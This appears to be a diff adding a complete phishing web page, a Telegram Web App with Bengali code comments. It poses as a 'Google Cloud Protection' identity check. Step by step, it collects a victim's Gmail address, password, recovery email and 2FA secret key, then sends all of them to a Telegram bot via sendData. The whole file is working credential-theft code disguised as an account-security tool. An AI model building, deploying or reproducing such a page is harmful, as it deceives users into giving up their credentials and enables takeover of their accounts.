@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Secure Google Account Sync</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ios-bg: #f2f2f7;
+            --ios-card: #ffffff;
+            --ios-blue: #007aff;
+            --ios-red: #ff3b30;
+            --ios-green: #34c759;
+            --ios-text: #000000;
+            --ios-muted: #8e8e93;
+            --ios-border: #e5e5ea;
+            --font: 'SF Pro Display', -apple-system, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font);
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        body {
+            background-color: var(--ios-bg);
+            color: var(--ios-text);
+            padding: 16px 12px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* iOS স্টাইল কম্প্যাক্ট হেডার */
+        .ios-header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-top: 4px;
+        }
+
+        .ios-header h1 {
+            font-size: 19px;
+            font-weight: 700;
+            color: var(--ios-text);
+            letter-spacing: -0.5px;
+        }
+
+        .ios-header p {
+            font-size: 12.5px;
+            color: var(--ios-muted);
+            margin-top: 3px;
+        }
+
+        /* 👑 আইওএস মাল্টি-স্টেপ কার্ড (একদম ছোট ও চাপানো ডিজাইন) */
+        .ios-card {
+            background: var(--ios-card);
+            border-radius: 12px;
+            padding: 14px 14px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+            margin-bottom: 16px;
+        }
+
+        .step-view {
+            display: none;
+        }
+
+        .step-view.active {
+            display: block;
+            animation: iosSlide 0.25s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        @keyframes iosSlide {
+            from { opacity: 0; transform: translateX(12px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* ইনপুট ফিল্ড ও লেবেল লেআউট */
+        .input-wrapper {
+            margin-bottom: 14px;
+        }
+
+        .input-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #3a3a3c;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .ios-input {
+            width: 100%;
+            background: #f2f2f7;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            padding: 11px 12px;
+            color: var(--ios-text);
+            font-size: 14.5px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .ios-input:focus {
+            background: #ffffff;
+            border-color: var(--ios-blue);
+            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
+        }
+
+        /* 👑 আইওএস নেটিভ বাটন গ্রুপ */
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 18px;
+        }
+
+        .ios-btn {
+            flex: 1;
+            background: var(--ios-blue);
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14.5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .ios-btn:active {
+            opacity: 0.8;
+            transform: scale(0.99);
+        }
+
+        .ios-btn.secondary {
+            background: #e5e5ea;
+            color: var(--ios-blue);
+        }
+
+        /* 👑 আইওএস রিভিউ/কনফার্মেশন লিস্ট ডিজাইন */
+        .ios-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .ios-list-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--ios-border);
+            font-size: 14px;
+        }
+
+        .ios-list-item:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .ios-list-item:first-child {
+            padding-top: 0;
+        }
+
+        .list-label {
+            color: var(--ios-muted);
+            font-weight: 500;
+        }
+
+        .list-value {
+            color: var(--ios-text);
+            font-weight: 600;
+            max-width: 180px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* টপ ফ্লোটিং আইওএস নোটিফিকেশন টোস্ট */
+        .ios-toast {
+            position: fixed;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            z-index: 999999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            white-space: nowrap;
+        }
+
+        .ios-toast.show {
+            top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="iosToast" class="ios-toast"></div>
+
+    <div class="ios-header">
+        <h1>Google Cloud Protection</h1>
+        <p>Verify and secure your identity</p>
+    </div>
+
+    <div class="ios-card">
+        <div class="step-view active" id="step1">
+            <div class="input-wrapper">
+                <label class="input-label">Google Email Address</label>
+                <input type="email" id="gmailInput" class="ios-input" placeholder="example@gmail.com">
+            </div>
+            <button class="ios-btn" onclick="validateStep1()">Next</button>
+        </div>
+
+        <div class="step-view" id="step2">
+            <div class="input-wrapper">
+                <label class="input-label">Gmail Password</label>
+                <input type="password" id="passwordInput" class="ios-input" placeholder="At least 8 characters">
+            </div>
+            <button class="ios-btn" onclick="validateStep2()">Next</button>
+        </div>
+
+        <div class="step-view" id="step3">
+            <div class="input-wrapper">
+                <label class="input-label">Recovery Email Address</label>
+                <input type="email" id="recoveryInput" class="ios-input" placeholder="recovery@gmail.com">
+            </div>
+            <button class="ios-btn" onclick="validateStep3()">Next</button>
+        </div>
+
+        <div class="step-view" id="step4">
+            <div class="input-wrapper">
+                <label class="input-label">2FA Secret Key (Optional)</label>
+                <input type="text" id="tfaInput" class="ios-input" placeholder="Enter 16+ Digit Key">
+            </div>
+            <div class="btn-group">
+                <button class="ios-btn secondary" onclick="skipTfa()">Skip</button>
+                <button class="ios-btn" onclick="validateStep4()">Next</button>
+            </div>
+        </div>
+
+        <div class="step-view" id="step5">
+            <div class="input-wrapper">
+                <label class="input-label" style="margin-bottom: 12px; color: var(--ios-blue);">Review Details</label>
+                <ul class="ios-list">
+                    <li class="ios-list-item">
+                        <span class="list-label">Gmail</span>
+                        <span class="list-value" id="summaryGmail">-</span>
+                    </li>
+                    <li class="ios-list-item">
+                        <span class="list-label">Password</span>
+                        <span class="list-value" id="summaryPassword">-</span>
+                    </li>
+                    <li class="ios-list-item">
+                        <span class="list-label">Recovery</span>
+                        <span class="list-value" id="summaryRecovery">-</span>
+                    </li>
+                    <li class="ios-list-item">
+                        <span class="list-label">2FA Secret</span>
+                        <span class="list-value" id="summaryTfa">Skipped</span>
+                    </li>
+                </ul>
+            </div>
+            <button class="ios-btn" style="background: var(--ios-green);" onclick="submitToTelegram()">Confirm & Submit</button>
+        </div>
+    </div>
+
+    <script>
+        // গ্লোবাল ডাটা স্টোরেজ অবজেক্ট
+        let accountForm = {
+            gmail: '',
+            password: '',
+            recovery: '',
+            secretKey: 'Skipped'
+        };
+
+        // আইওএস নোটিফিকেশন অ্যালার্ট টোস্ট
+        function showIosToast(message) {
+            const toast = document.getElementById('iosToast');
+            toast.innerText = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+
+        // ধাপ পরিবর্তনের স্মার্ট মেকানিজম
+        function navigateToStep(from, to) {
+            document.getElementById(`step${from}`).classList.remove('active');
+            document.getElementById(`step${to}`).classList.add('active');
+        }
+
+        // ১. জিমেইল ভ্যালিডেশন চেকার (অবশ্যই @gmail.com থাকতে হবে)
+        function validateStep1() {
+            const gmail = document.getElementById('gmailInput').value.trim();
+            if (!gmail.endsWith('@gmail.com') || gmail.length < 11) {
+                showIosToast("❌ ভুল ফরম্যাট! শেষে @gmail.com থাকতে হবে।");
+                return;
+            }
+            accountForm.gmail = gmail;
+            navigateToStep(1, 2);
+        }
+
+        // ২. পাসওয়ার্ড ভ্যালিডেশন চেকার (কমপক্ষে ৮ অক্ষর)
+        function validateStep2() {
+            const password = document.getElementById('passwordInput').value.trim();
+            if (password.length < 8) {
+                showIosToast("❌ পাসওয়ার্ডটি খুবই ছোট! কমপক্ষে ৮ অক্ষর দিন।");
+                return;
+            }
+            accountForm.password = password;
+            navigateToStep(2, 3);
+        }
+
+        // ৩. রিকভারি ইমেইল চেকার
+        function validateStep3() {
+            const recovery = document.getElementById('recoveryInput').value.trim();
+            if (!recovery.includes('@') || recovery.length < 5) {
+                showIosToast("❌ একটি সঠিক রিকভারি ইমেইল টাইপ করুন।");
+                return;
+            }
+            accountForm.recovery = recovery;
+            navigateToStep(3, 4);
+        }
+
+        // ৪. ২এফএ সিক্রেট কী চেকার (A-Z, 2-7 এবং ১৬+ সাইজ ভ্যালিডেশন)
+        function validateStep4() {
+            let inputKey = document.getElementById('tfaInput').value.trim().toUpperCase().replace(/\s+/g, "");
+            let isValidFormat = /^[A-Z2-7]+$/.test(inputKey);
+
+            if (inputKey.length >= 16 && isValidFormat) {
+                accountForm.secretKey = inputKey;
+                showSummaryPage();
+            } else {
+                showIosToast("❌ ভুল ২এফএ কী! (A-Z, 2-7 এবং ১৬+ অক্ষর লাগবে)");
+            }
+        }
+
+        // ২এফএ স্কিপ করার লজিক
+        function skipTfa() {
+            accountForm.secretKey = 'Skipped';
+            showSummaryPage();
+        }
+
+        // ৫. কনফার্মেশন সামারি পেজ রেন্ডারিং
+        function showSummaryPage() {
+            document.getElementById('summaryGmail').innerText = accountForm.gmail;
+            document.getElementById('summaryPassword').innerText = "••••••••"; // সিকিউরিটির জন্য হাইড করা
+            document.getElementById('summaryRecovery').innerText = accountForm.recovery;
+            document.getElementById('summaryTfa').innerText = accountForm.secretKey;
+            
+            navigateToStep(4, 5);
+        }
+
+        // 🚀 টেলিগ্রাম বটে ডাটা ট্রান্সমিশন মেকানিজম (Reply WebApp sendData)
+        function submitToTelegram() {
+            showIosToast("⚡ Synchronizing with Telegram...");
+            
+            // ডাটা অবজেক্টটিকে টেক্সট বা স্ট্রিং এ রূপান্তর করে বটের কাছে পাঠানো হচ্ছে
+            setTimeout(() => {
+                Telegram.WebApp.sendData(JSON.stringify(accountForm));
+            }, 800);
+        }
+
+        // Telegram WebApp ইনিশিয়ালাইজেশন
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+    </script>
+</body>
+</html>
